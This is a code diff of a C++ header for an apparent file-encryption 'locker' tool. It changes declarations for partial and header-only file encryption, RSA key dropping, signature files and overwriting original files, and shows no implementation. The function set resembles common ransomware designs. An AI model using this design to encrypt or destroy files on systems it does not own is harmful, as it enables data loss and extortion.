@@ -5,6 +5,7 @@
 #include "structures.h"
 #include "pathsystem.h"
 #include "locker.h"
+#include "global_parameters.h"
 
 namespace filesystem
 {
@@ -14,18 +15,19 @@ namespace filesystem
 	BOOL EncryptFilePartly(PFILE_INFO FileInfo, BYTE DataPercent);
 	BOOL EncryptFileBlock(PFILE_INFO FileInfo);
 	BOOL EncryptFileHeader(PFILE_INFO FileInfo);
+	BOOL OptionEncryptMode(PFILE_INFO FileInfo, EncryptModes& mode);
 	WCHAR* MakeCopyFile(WCHAR* Path, WCHAR* Filename, WCHAR* exst, WCHAR* FPath);
 	BOOL ReadFile_(PFILE_INFO FileInfo);
 	BOOL DropRSAKey(WCHAR* Path, BYTE PublicKey[], BYTE PrivateKey[], DWORD SizeKey, DWORD p_SizeKey);
-	BOOL EncryptRSA(WCHAR* KeyFile, WCHAR* Filename, WCHAR* newFileName);
-	BOOL FileCryptEncrypt(CRYPT_INFO* CryptInfo, WCHAR* KeyFile, WCHAR* FileCrypt, WCHAR* newFilename);
-	BOOL FileCryptDecrypt(CRYPT_INFO* CryptInfo, WCHAR* KeyFile,WCHAR* FileCrypt,WCHAR* newFilename);
-	BOOL HashSignatureFile(SLIST<locker::HLIST>* list, WCHAR* FPath, WCHAR* Filename);
+	BOOL EncryptRSA(PFILE_INFO FileInfo, WCHAR* KeyFile);
+	BOOL FileCryptEncrypt(PFILE_INFO FileInfo, WCHAR* KeyFile);
+	BOOL FileCryptDecrypt(PFILE_INFO FileInfo, WCHAR* KeyFile);
+	BOOL HashSignatureFile(SLIST<locker::HLIST>* list, PFILE_INFO FileInfo);
 	VOID sort_hash_list(SLIST<HASH_LIST>* list);
 	BOOL CreateSignatureFile(SLIST<HASH_LIST>* HashList, WCHAR* SignatureName, BYTE* SignatureRoot, DWORD sig_len);
 	BOOL VerificationSignatureFile(SLIST<HASH_LIST>* HashList, WCHAR* SignatureName, BYTE* SignatureRoot, DWORD sig_len);
 	VOID RootKeySignatureTrust(VOID);
-	BOOL OverWriteFile(WCHAR* Path);
+	BOOL OverWriteFile(PFILE_INFO FileInfo);
 }
 
 
